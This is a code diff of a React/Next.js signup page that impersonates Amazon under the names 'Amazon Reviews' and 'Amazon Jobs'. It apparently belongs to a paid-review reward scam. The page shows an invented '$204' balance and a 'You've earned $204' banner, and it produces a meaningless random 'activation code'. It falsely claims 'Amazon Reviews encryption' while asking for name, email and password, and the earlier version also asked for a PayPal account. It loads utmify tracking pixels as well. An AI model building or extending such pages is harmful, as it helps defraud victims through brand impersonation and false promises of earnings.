@@ -2,300 +2,221 @@
 
 import type React from "react"
 
-import { useState, useEffect } from "react"
+import { useState } from "react"
+import { useRouter } from "next/navigation"
+import Script from "next/script"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
-import { Label } from "@/components/ui/label"
-import Image from "next/image"
-import Link from "next/link"
-import { ArrowLeft } from "lucide-react"
-import { useRouter } from "next/navigation"
+import { Checkbox } from "@/components/ui/checkbox"
 
-export default function SignUpPage() {
+export default function SignupPage() {
   const router = useRouter()
-  const [formData, setFormData] = useState({
-    name: "",
-    email: "",
-    password: "",
-    paypalAccount: "",
-    age: "",
-    reviewExperience: "",
-  })
-  const [showLoadingModal, setShowLoadingModal] = useState(false)
-  const [progress, setProgress] = useState(0)
+  const [fullName, setFullName] = useState("")
+  const [email, setEmail] = useState("")
+  const [password, setPassword] = useState("")
+  const [acceptTerms, setAcceptTerms] = useState(false)
+  const [activationCode] = useState(generateActivationCode())
 
-  useEffect(() => {
-    const savedFormData = localStorage.getItem("signupFormData")
-    if (savedFormData) {
-      try {
-        const parsed = JSON.parse(savedFormData)
-        setFormData(parsed)
-      } catch (error) {
-        console.error("Error loading saved form data:", error)
+  function generateActivationCode() {
+    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    const segments = []
+    for (let i = 0; i < 3; i++) {
+      let segment = ""
+      for (let j = 0; j < 4; j++) {
+        segment += chars.charAt(Math.floor(Math.random() * chars.length))
       }
+      segments.push(segment)
     }
-  }, [])
-
-  useEffect(() => {
-    if (
-      formData.name ||
-      formData.email ||
-      formData.password ||
-      formData.paypalAccount ||
-      formData.age ||
-      formData.reviewExperience
-    ) {
-      localStorage.setItem("signupFormData", JSON.stringify(formData))
-    }
-  }, [formData])
-
-  useEffect(() => {
-    if (showLoadingModal) {
-      const interval = setInterval(() => {
-        setProgress((prev) => {
-          if (prev >= 100) {
-            clearInterval(interval)
-            setTimeout(() => {
-              localStorage.removeItem("signupFormData")
-              router.push("/dashboard")
-            }, 500)
-            return 100
-          }
-          return prev + 2
-        })
-      }, 50)
-
-      return () => clearInterval(interval)
-    }
-  }, [showLoadingModal, router])
+    return segments.join("-")
+  }
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault()
-    console.log("Form submitted:", formData)
-    localStorage.setItem("userName", formData.name)
-    localStorage.setItem("userEmail", formData.email)
-    localStorage.setItem("userPayPal", formData.paypalAccount)
-    localStorage.setItem("userAge", formData.age)
-    localStorage.setItem("userReviewExperience", formData.reviewExperience)
-    setShowLoadingModal(true)
-    setProgress(0)
-  }
+    if (!fullName || !email || !password || !acceptTerms) {
+      alert("Please fill in all fields and accept the terms")
+      return
+    }
 
-  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
-    setFormData({
-      ...formData,
-      [e.target.name]: e.target.value,
-    })
+    // Store registration data
+    localStorage.setItem("userRegistered", "true")
+    localStorage.setItem("userName", fullName)
+    localStorage.setItem("userEmail", email)
+
+    // Redirect to dashboard
+    router.push("/dashboard")
   }
 
   return (
-    <div className="relative min-h-screen bg-[#0a0a0f] text-white overflow-hidden">
-      <div className="absolute inset-0 bg-gradient-to-br from-orange-500/10 via-[#0a0a0f] to-orange-600/10" />
-
-      <header className="relative z-10 flex items-center justify-between p-6">
-        <Link href="/" className="flex items-center gap-2">
-          <Image src="/amazon-jobs-logo.png" alt="Amazon Jobs" width={180} height={60} className="h-12 w-auto" />
-        </Link>
-        <Link href="/">
-          <Button variant="ghost" size="icon" className="text-white hover:bg-white/10">
-            <ArrowLeft className="w-6 h-6" />
-          </Button>
-        </Link>
+    <div className="min-h-screen bg-gray-100">
+      {/* Header */}
+      <header className="bg-[#131921] text-white p-4 flex items-center justify-between">
+        <div className="flex items-center gap-2">
+          <img src="/amazon-reviews-logo.png" alt="Amazon Reviews" className="h-8 w-auto object-contain" />
+        </div>
+        <div className="text-sm">
+          Balance: <span className="text-green-400 font-bold">$204</span>
+        </div>
       </header>
 
-      <main className="relative z-10 flex flex-col items-center justify-center min-h-[calc(100vh-200px)] px-6">
-        <div className="w-full max-w-md">
-          <h1 className="text-4xl md:text-5xl font-bold text-center mb-2">Create Account</h1>
-          <p className="text-gray-400 text-center mb-8">Join us and start earning today</p>
-
-          <form onSubmit={handleSubmit} className="space-y-6">
-            {/* Name Field */}
-            <div className="space-y-2">
-              <Label htmlFor="name" className="text-white text-sm font-medium">
-                Full Name
-              </Label>
-              <Input
-                id="name"
-                name="name"
-                type="text"
-                placeholder="Enter your full name"
-                value={formData.name}
-                onChange={handleChange}
-                required
-                className="bg-gray-900/50 border-gray-700 text-white placeholder:text-gray-500 focus:border-orange-400 focus:ring-orange-400"
-              />
-            </div>
-
-            {/* Email Field */}
-            <div className="space-y-2">
-              <Label htmlFor="email" className="text-white text-sm font-medium">
-                Email Address
-              </Label>
-              <Input
-                id="email"
-                name="email"
-                type="email"
-                placeholder="Enter your email"
-                value={formData.email}
-                onChange={handleChange}
-                required
-                className="bg-gray-900/50 border-gray-700 text-white placeholder:text-gray-500 focus:border-orange-400 focus:ring-orange-400"
-              />
-            </div>
-
-            {/* Password Field */}
-            <div className="space-y-2">
-              <Label htmlFor="password" className="text-white text-sm font-medium">
-                Password
-              </Label>
-              <Input
-                id="password"
-                name="password"
-                type="password"
-                placeholder="Create a strong password"
-                value={formData.password}
-                onChange={handleChange}
-                required
-                className="bg-gray-900/50 border-gray-700 text-white placeholder:text-gray-500 focus:border-orange-400 focus:ring-orange-400"
-              />
-            </div>
-
-            {/* PayPal Account Field */}
-            <div className="space-y-2">
-              <Label htmlFor="paypalAccount" className="text-white text-sm font-medium">
-                PayPal Account
-              </Label>
-              <Input
-                id="paypalAccount"
-                name="paypalAccount"
-                type="email"
-                placeholder="Enter your PayPal email for withdrawals"
-                value={formData.paypalAccount}
-                onChange={handleChange}
-                required
-                className="bg-gray-900/50 border-gray-700 text-white placeholder:text-gray-500 focus:border-orange-400 focus:ring-orange-400"
-              />
-              <p className="text-xs text-gray-500">This will be used for your earnings withdrawals</p>
-            </div>
-
-            <div className="space-y-2">
-              <Label htmlFor="age" className="text-white text-sm font-medium">
-                Age
-              </Label>
-              <select
-                id="age"
-                name="age"
-                value={formData.age}
-                onChange={handleChange}
-                required
-                className="w-full bg-gray-900/50 border border-gray-700 text-white rounded-md px-3 py-2 focus:border-orange-400 focus:ring-orange-400 focus:outline-none"
-              >
-                <option value="" disabled className="bg-gray-900">
-                  Select age range
-                </option>
-                <option value="18-25" className="bg-gray-900">
-                  18-25
-                </option>
-                <option value="26-35" className="bg-gray-900">
-                  26-35
-                </option>
-                <option value="36-45" className="bg-gray-900">
-                  36-45
-                </option>
-                <option value="46-55" className="bg-gray-900">
-                  46-55
-                </option>
-                <option value="56+" className="bg-gray-900">
-                  56+
-                </option>
-              </select>
-            </div>
-
-            <div className="space-y-2">
-              <Label htmlFor="reviewExperience" className="text-white text-sm font-medium">
-                Review Experience
-              </Label>
-              <select
-                id="reviewExperience"
-                name="reviewExperience"
-                value={formData.reviewExperience}
-                onChange={handleChange}
-                required
-                className="w-full bg-gray-900/50 border border-gray-700 text-white rounded-md px-3 py-2 focus:border-orange-400 focus:ring-orange-400 focus:outline-none"
-              >
-                <option value="" disabled className="bg-gray-900">
-                  Select experience level
-                </option>
-                <option value="Beginner" className="bg-gray-900">
-                  Beginner
-                </option>
-                <option value="Intermediate" className="bg-gray-900">
-                  Intermediate
-                </option>
-                <option value="Advanced" className="bg-gray-900">
-                  Advanced
-                </option>
-              </select>
-            </div>
-
-            <Button
-              type="submit"
-              size="lg"
-              className="w-full bg-gradient-to-r from-orange-400 to-orange-600 hover:from-orange-500 hover:to-orange-700 text-white text-lg font-semibold py-6 rounded-full shadow-lg shadow-orange-400/30"
-            >
-              Create Account
-            </Button>
-          </form>
-
-          <p className="text-center text-gray-400 mt-6">
-            Already have an account?{" "}
-            <Link href="/" className="text-orange-400 hover:text-orange-300 font-semibold">
-              Log In
-            </Link>
+      {/* Success Message */}
+      <div className="max-w-2xl mx-auto mt-8 px-4">
+        <div className="bg-green-100 border-l-4 border-green-500 p-4 mb-6">
+          <p className="text-green-800">
+            <span className="font-bold">Congratulations!</span> You've earned $204! Complete your registration to
+            withdraw your earnings.
           </p>
         </div>
-      </main>
 
-      <footer className="relative z-10 text-center py-8 text-sm text-gray-400">© 2025 LLC, All rights reserved.</footer>
+        {/* Registration Form */}
+        <div className="bg-white rounded-lg shadow-lg p-8">
+          <h1 className="text-3xl font-bold text-center mb-2">Register for Amazon Reviews</h1>
+          <p className="text-center text-gray-600 mb-8">
+            Create your account to access the official app and withdraw your earnings
+          </p>
 
-      {showLoadingModal && (
-        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm">
-          <div className="bg-gradient-to-br from-gray-900 to-gray-800 rounded-2xl p-8 max-w-md w-full mx-4 shadow-2xl border border-orange-500/20">
-            <div className="text-center mb-6">
-              <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-gradient-to-r from-orange-400 to-orange-600 flex items-center justify-center">
-                <svg
-                  className="w-8 h-8 text-white animate-spin"
-                  xmlns="http://www.w3.org/2000/svg"
-                  fill="none"
-                  viewBox="0 0 24 24"
-                >
-                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+          <form onSubmit={handleSubmit} className="space-y-6">
+            {/* Full Name */}
+            <div>
+              <label htmlFor="fullName" className="block text-sm font-medium text-gray-700 mb-2">
+                Full Name
+              </label>
+              <Input
+                id="fullName"
+                type="text"
+                value={fullName}
+                onChange={(e) => setFullName(e.target.value)}
+                className="w-full"
+                required
+              />
+            </div>
+
+            {/* Email Address */}
+            <div>
+              <label htmlFor="email" className="block text-sm font-medium text-gray-700 mb-2">
+                Email Address
+              </label>
+              <Input
+                id="email"
+                type="email"
+                placeholder="Enter your email"
+                value={email}
+                onChange={(e) => setEmail(e.target.value)}
+                className="w-full"
+                required
+              />
+            </div>
+
+            {/* Password */}
+            <div>
+              <label htmlFor="password" className="block text-sm font-medium text-gray-700 mb-2">
+                Password
+              </label>
+              <Input
+                id="password"
+                type="password"
+                placeholder="Create a secure password"
+                value={password}
+                onChange={(e) => setPassword(e.target.value)}
+                className="w-full"
+                required
+              />
+            </div>
+
+            {/* App Activation Code */}
+            <div>
+              <label htmlFor="activationCode" className="block text-sm font-medium text-gray-700 mb-2">
+                App Activation Code
+              </label>
+              <div className="relative">
+                <Input
+                  id="activationCode"
+                  type="text"
+                  value={activationCode}
+                  readOnly
+                  className="w-full bg-green-50 border-green-300 text-green-700 font-bold pr-12"
+                />
+                <div className="absolute right-3 top-1/2 -translate-y-1/2">
+                  <svg className="w-6 h-6 text-green-500" fill="currentColor" viewBox="0 0 20 20">
+                    <path
+                      fillRule="evenodd"
+                      d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z"
+                      clipRule="evenodd"
+                    />
+                  </svg>
+                </div>
+              </div>
+              <p className="text-sm text-green-600 mt-1 flex items-center gap-1">
+                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                   <path
-                    className="opacity-75"
-                    fill="currentColor"
-                    d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
-                  ></path>
+                    fillRule="evenodd"
+                    d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
+                    clipRule="evenodd"
+                  />
                 </svg>
-              </div>
-              <h2 className="text-2xl font-bold text-white mb-2">Customizing account and adding bonus</h2>
-              <p className="text-gray-400 text-sm">Please wait...</p>
+                Your unique activation code has been generated automatically
+              </p>
             </div>
 
-            <div className="space-y-2">
-              <div className="flex justify-between text-sm text-gray-400">
-                <span>Progress</span>
-                <span className="font-semibold text-orange-400">{progress}%</span>
-              </div>
-              <div className="w-full h-3 bg-gray-700 rounded-full overflow-hidden">
-                <div
-                  className="h-full bg-gradient-to-r from-orange-400 to-orange-600 transition-all duration-300 ease-out rounded-full"
-                  style={{ width: `${progress}%` }}
-                ></div>
-              </div>
+            {/* Terms and Conditions */}
+            <div className="flex items-start gap-2">
+              <Checkbox
+                id="terms"
+                checked={acceptTerms}
+                onCheckedChange={(checked) => setAcceptTerms(checked as boolean)}
+              />
+              <label htmlFor="terms" className="text-sm text-gray-700 cursor-pointer">
+                I accept the{" "}
+                <a href="#" className="text-orange-500 hover:underline">
+                  Amazon Reviews Terms of Service
+                </a>{" "}
+                and{" "}
+                <a href="#" className="text-orange-500 hover:underline">
+                  Privacy Policy
+                </a>
+              </label>
             </div>
-          </div>
+
+            {/* Submit Button */}
+            <Button
+              type="submit"
+              className="w-full bg-orange-500 hover:bg-orange-600 text-white font-bold py-6 text-lg"
+            >
+              ACCESS THE APP
+            </Button>
+
+            {/* Security Message */}
+            <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 flex items-center gap-2">
+              <svg className="w-5 h-5 text-blue-600 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
+                <path
+                  fillRule="evenodd"
+                  d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z"
+                  clipRule="evenodd"
+                />
+              </svg>
+              <p className="text-sm text-blue-800">
+                Your information is secure and protected by Amazon Reviews encryption
+              </p>
+            </div>
+          </form>
         </div>
-      )}
+      </div>
+
+      <Script
+        src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+        data-utmify-prevent-subids
+        strategy="afterInteractive"
+      />
+
+      <Script id="utmify-pixel-signup" strategy="afterInteractive">
+        {`
+          window.pixelId = "68f1866c83f000910cb3b253";
+          var a = document.createElement("script");
+          a.setAttribute("async", "");
+          a.setAttribute("defer", "");
+          a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+          document.head.appendChild(a);
+        `}
+      </Script>
     </div>
   )
 }
